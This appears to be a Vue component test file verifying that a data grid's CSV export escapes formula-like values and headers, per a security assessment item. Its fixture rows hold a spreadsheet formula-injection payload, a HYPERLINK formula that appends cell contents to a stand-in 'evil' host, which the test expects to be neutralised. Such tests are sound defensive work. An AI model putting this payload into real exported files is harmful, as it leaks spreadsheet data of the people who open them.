import { describe, it, expect, vi } from 'vitest';
import { render, fireEvent } from '@testing-library/vue';
import { defineComponent, h, ref } from 'vue';
import PrimeVue from 'primevue/config';
import DataGrid from '@/components/DataGrid.vue';
import type { ColMeta } from '@/composables/useTableColumns';

// Query Console result grid: PrimeVue's own exportCSV(), made formula-safe via
// :exportFunction / :exportHeader (security assessment M4).
describe('DataGrid CSV export (M4)', () => {
  it('exports formula-like values and headers as text while numbers stay numbers', async () => {
    const columns: ColMeta[] = [
      { field: 'col_0', header: '=evil', type: 'text' },
      { field: 'col_1', header: 'amount', type: 'numeric' },
    ];
    const rows = [
      { col_0: '=HYPERLINK("http://evil/?"&A1,"Click")', col_1: -5 },
      { col_0: '@SUM(A1)', col_1: 10 },
    ];

    let blob: Blob | undefined;
    vi.spyOn(URL, 'createObjectURL').mockImplementation((b) => { blob = b as Blob; return 'blob:test'; });
    vi.spyOn(HTMLAnchorElement.prototype, 'click').mockImplementation(() => {});

    const Host = defineComponent(() => {
      const grid = ref<InstanceType<typeof DataGrid>>();
      return () => h('div', [
        h('button', { 'data-testid': 'export', onClick: () => grid.value?.exportCSV() }),
        h(DataGrid, { ref: grid, columns, rows }),
      ]);
    });
    const { getByTestId } = render(Host, { global: { plugins: [[PrimeVue, { theme: 'none' }]] } });
    await fireEvent.click(getByTestId('export'));

    const csv = (await blob!.text()).replace(/^﻿/, '');
    const lines = csv.split('\n');
    expect(lines[0]).toBe(`"'=evil","amount"`);
    expect(lines[1]).toBe(`"'=HYPERLINK(""http://evil/?""&A1,""Click"")","-5"`);
    expect(lines[2]).toBe(`"'@SUM(A1)","10"`);
  });
});
